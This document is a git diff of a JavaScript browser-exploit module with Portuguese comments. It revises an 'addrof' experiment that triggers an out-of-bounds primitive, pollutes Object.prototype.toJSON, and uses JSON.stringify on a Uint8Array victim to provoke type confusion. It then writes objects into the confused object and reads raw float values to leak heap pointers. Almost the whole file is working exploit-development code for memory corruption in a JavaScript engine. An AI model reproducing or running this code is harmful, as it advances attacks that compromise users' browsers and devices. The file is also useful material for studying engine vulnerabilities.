@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v8_ReInspectConfusedThis)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v9_ProbeReturnsUndefined)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,87 +9,53 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT = "OriginalHeisenbug_TypedArrayAddrof_v8_ReInspectConfusedThis";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU = "OriginalHeisenbug_TypedArrayAddrof_v9_ProbeReturnsUndefined";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-let last_probe_call_details_v8 = null; 
-let object_to_leak_A_v8 = null;
-let object_to_leak_B_v8 = null;
-let victim_typed_array_ref_v8 = null;
+let last_probe_call_details_v9 = null; 
+let object_to_leak_A_v9 = null;
+let object_to_leak_B_v9 = null;
+let victim_typed_array_ref_v9 = null;
 
-function toJSON_TA_Probe_ReInspectConfusedThis() {
+function toJSON_TA_Probe_ReturnsUndefined() {
     let current_call_details = {
-        probe_variant: "TA_Probe_Addrof_v8_ReInspectConfusedThis",
+        probe_variant: "TA_Probe_Addrof_v9_ProbeReturnsUndefined",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
         this_was_victim_ref_when_confused: null,
-        writes_attempted_on_confused_this: false,
-        confused_this_info: {} // Para armazenar dados de introspecção
+        writes_attempted_on_confused_this: false
     };
 
     try {
         current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
         
-        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v8? ${this === victim_typed_array_ref_v8}`, "leak");
+        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v9? ${this === victim_typed_array_ref_v9}`, "leak");
 
         if (current_call_details.this_type_in_toJSON === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
             
-            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v8);
-            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v8? ${current_call_details.this_was_victim_ref_when_confused}`, "info");
-
-            // Introspecção do 'this' confuso
-            const confused_this_info = current_call_details.confused_this_info;
-            try {
-                confused_this_info.keys = Object.keys(this);
-                logS3(`[${current_call_details.probe_variant}] Confused 'this' keys: [${confused_this_info.keys.join(', ')}]`, "leak");
-            } catch (e_keys) { confused_this_info.keys_error = e_keys.message; }
-            
-            try {
-                confused_this_info.ownPropertyNames = Object.getOwnPropertyNames(this);
-                logS3(`[${current_call_details.probe_variant}] Confused 'this' ownPropertyNames: [${confused_this_info.ownPropertyNames.join(', ')}]`, "leak");
-            } catch (e_own_props) { confused_this_info.ownPropertyNames_error = e_own_props.message; }
-
-            try {
-                confused_this_info.buffer_prop = String(this.buffer);
-                logS3(`[${current_call_details.probe_variant}] Confused 'this.buffer': ${confused_this_info.buffer_prop}`, "leak");
-                if (this.buffer === victim_typed_array_ref_v8.buffer) {
-                    logS3(`[${current_call_details.probe_variant}] !!!! Confused 'this.buffer' IS THE VICTIM'S BUFFER !!!!`, "vuln");
-                    confused_this_info.buffer_is_victim_buffer = true;
-                } else {
-                     confused_this_info.buffer_is_victim_buffer = false;
-                }
-            } catch (e_buffer) { confused_this_info.buffer_prop_error = e_buffer.message; }
-            
-            try {
-                confused_this_info.byteLength_prop = String(this.byteLength);
-                logS3(`[${current_call_details.probe_variant}] Confused 'this.byteLength': ${confused_this_info.byteLength_prop}`, "leak");
-            } catch (e_bl) { confused_this_info.byteLength_prop_error = e_bl.message; }
-             try {
-                confused_this_info.length_prop = String(this.length);
-                logS3(`[${current_call_details.probe_variant}] Confused 'this.length': ${confused_this_info.length_prop}`, "leak");
-            } catch (e_l) { confused_this_info.length_prop_error = e_l.message; }
-
+            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v9);
+            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v9? ${current_call_details.this_was_victim_ref_when_confused}`, "info");
 
             logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
-            if (object_to_leak_A_v8) {
-                this[0] = object_to_leak_A_v8;
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v8 to this[0].`, "info");
+            if (object_to_leak_A_v9) {
+                this[0] = object_to_leak_A_v9;
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v9 to this[0].`, "info");
             }
-            if (object_to_leak_B_v8) {
-                this[1] = object_to_leak_B_v8;
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v8 to this[1].`, "info");
+            if (object_to_leak_B_v9) {
+                this[1] = object_to_leak_B_v9;
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v9 to this[1].`, "info");
             }
             current_call_details.writes_attempted_on_confused_this = true;
 
-        } else if (this === victim_typed_array_ref_v8) {
-            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v8, type is ${current_call_details.this_type_in_toJSON}. No confusion yet for this 'this'.`, "info");
+        } else if (this === victim_typed_array_ref_v9) {
+            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v9, type is ${current_call_details.this_type_in_toJSON}. No confusion for this 'this' in this call.`, "info");
         } else {
-            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v8. No action.`, "warn");
+            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v9. No action.`, "warn");
         }
 
     } catch (e) {
@@ -97,29 +63,30 @@ function toJSON_TA_Probe_ReInspectConfusedThis() {
         logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
     }
     
-    last_probe_call_details_v8 = { ...current_call_details }; 
+    last_probe_call_details_v9 = { ...current_call_details }; 
+    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v9' updated. Returning undefined.`, "dev_verbose");
 
-    return { minimal_probe_v8_rict_did_execute: true }; 
+    return undefined; // MODIFICAÇÃO PRINCIPAL
 }
 
-export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT}.triggerAndAddrof`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, ReInspectConfusedThis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT} Init...`;
+export async function executeTypedArrayVictimAddrofTest_ProbeReturnsUndefined() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU}.triggerAndAddrof`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, ProbeReturnsUndefined) & Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU} Init...`;
 
-    last_probe_call_details_v8 = null;
-    victim_typed_array_ref_v8 = null; 
-    object_to_leak_A_v8 = { marker: "ObjA_TA_v8rict", id: Date.now() }; 
-    object_to_leak_B_v8 = { marker: "ObjB_TA_v8rict", id: Date.now() + Math.floor(Math.random() * 1000) };
+    last_probe_call_details_v9 = null;
+    victim_typed_array_ref_v9 = null; 
+    object_to_leak_A_v9 = { marker: "ObjA_TA_v9pru", id: Date.now() }; 
+    object_to_leak_B_v9 = { marker: "ObjB_TA_v9pru", id: Date.now() + Math.floor(Math.random() * 1000) };
 
     let errorCapturedMain = null;
-    let stringifyOutput = null;
+    let stringifyOutput = null; // O que JSON.stringify realmente retorna
     let captured_probe_details_after_stringify = null;
     
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
     
-    const fillPattern = 0.98765098765098;
+    const fillPattern = 0.09090909090909;
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -135,15 +102,15 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
         
         await PAUSE_S3(100);
 
-        victim_typed_array_ref_v8 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v8.buffer); 
+        victim_typed_array_ref_v9 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
+        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v9.buffer); 
         
         for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
             float64_view_on_underlying_ab[i] = fillPattern + i;
         }
 
-        logS3(`STEP 2: victim_typed_array_ref_v8 (Uint8Array) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
-        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v8 with ${toJSON_TA_Probe_ReInspectConfusedThis.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`STEP 2: victim_typed_array_ref_v9 (Uint8Array) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
+        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v9 with ${toJSON_TA_Probe_ReturnsUndefined.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -151,19 +118,21 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_TA_Probe_ReInspectConfusedThis,
+                value: toJSON_TA_Probe_ReturnsUndefined,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_ReInspectConfusedThis.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_ReturnsUndefined.name}.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v8)...`, "warn", FNAME_CURRENT_TEST);
-            stringifyOutput = JSON.stringify(victim_typed_array_ref_v8); 
+            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v9)...`, "warn", FNAME_CURRENT_TEST);
+            // Se toJSON retorna undefined, JSON.stringify serializa o objeto original como se toJSON não existisse.
+            // Para um Uint8Array, isso resulta em um objeto JSON onde as chaves são os índices e os valores são os bytes.
+            stringifyOutput = JSON.stringify(victim_typed_array_ref_v9); 
             
-            logS3(`  JSON.stringify(victim_typed_array_ref_v8) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify(victim_typed_array_ref_v9) completed. Stringify Output: ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info"); // Log truncado
             
-            if (last_probe_call_details_v8) {
-                captured_probe_details_after_stringify = { ...last_probe_call_details_v8 }; 
+            if (last_probe_call_details_v9) {
+                captured_probe_details_after_stringify = { ...last_probe_call_details_v9 }; 
             }
             logS3(`  Captured last probe call details: ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
@@ -173,17 +142,14 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
                 captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                 heisenbugObservedOnThisInProbe = true;
                 logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED (via captured details)! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v8? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
-                logS3(`    Writes attempted on confused 'this'? ${captured_probe_details_after_stringify.writes_attempted_on_confused_this}`, "info");
-                if (captured_probe_details_after_stringify.confused_this_info) {
-                    logS3(`    Confused 'this' info: ${JSON.stringify(captured_probe_details_after_stringify.confused_this_info)}`, "leak");
-                }
+                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v9? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
+                logS3(`    In confused probe, addrof writes attempted? ${captured_probe_details_after_stringify.writes_attempted_on_confused_this}`, "info");
             } else {
                 let msg = "Heisenbug on 'this' of probe NOT confirmed via captured last probe details.";
                 if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
                     msg += ` 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
                 } else if (!captured_probe_details_after_stringify) {
-                    msg += " Captured last probe details are null.";
+                    msg += " Captured last probe details are null (probe might not have been called as expected).";
                 }
                 logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
             }
@@ -200,7 +166,7 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
                 (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                 logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                 addrof_result_A.success = true;
-                addrof_result_A.message = "Heisenbug (ReInspect) observed & view[0] read suggests a pointer for ObjA.";
+                addrof_result_A.message = "Heisenbug (ProbeReturnsUndefined) observed & view[0] read suggests a pointer for ObjA.";
             } else {
                 addrof_result_A.message = "View[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                 if (heisenbugObservedOnThisInProbe) addrof_result_A.message = "Heisenbug on 'this' of probe observed, but " + addrof_result_A.message;
@@ -218,7 +184,7 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
                 (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                 logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                 addrof_result_B.success = true;
-                addrof_result_B.message = "Heisenbug (ReInspect) observed & view[1] read suggests a pointer for ObjB.";
+                addrof_result_B.message = "Heisenbug (ProbeReturnsUndefined) observed & view[1] read suggests a pointer for ObjB.";
             } else {
                 addrof_result_B.message = "View[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                  if (heisenbugObservedOnThisInProbe) addrof_result_B.message = "Heisenbug on 'this' of probe observed, but " + addrof_result_B.message;
@@ -227,17 +193,17 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
 
 
             if (addrof_result_A.success || addrof_result_B.success) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT}: Addr? SUCESSO!`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU}: Addr? SUCESSO!`;
             } else if (heisenbugObservedOnThisInProbe) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT}: Heisenbug Sonda OK, Addr Falhou`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU}: Heisenbug Sonda OK, Addr Falhou`;
             } else {
-                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT}: Heisenbug Sonda Falhou?`;
+                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU}: Heisenbug Sonda Falhou?`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU}: Stringify/Addrof ERR`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
@@ -249,7 +215,7 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
         logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V8_RICT} CRITICALLY FAILED`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V9_PRU} CRITICALLY FAILED`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
@@ -262,10 +228,10 @@ export async function executeTypedArrayVictimAddrofTest_ReInspectConfusedThis() 
             logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
         
-        object_to_leak_A_v8 = null;
-        object_to_leak_B_v8 = null;
-        victim_typed_array_ref_v8 = null; 
-        last_probe_call_details_v8 = null; 
+        object_to_leak_A_v9 = null;
+        object_to_leak_B_v9 = null;
+        victim_typed_array_ref_v9 = null; 
+        last_probe_call_details_v9 = null; 
     }
     return { 
         errorOccurred: errorCapturedMain, 
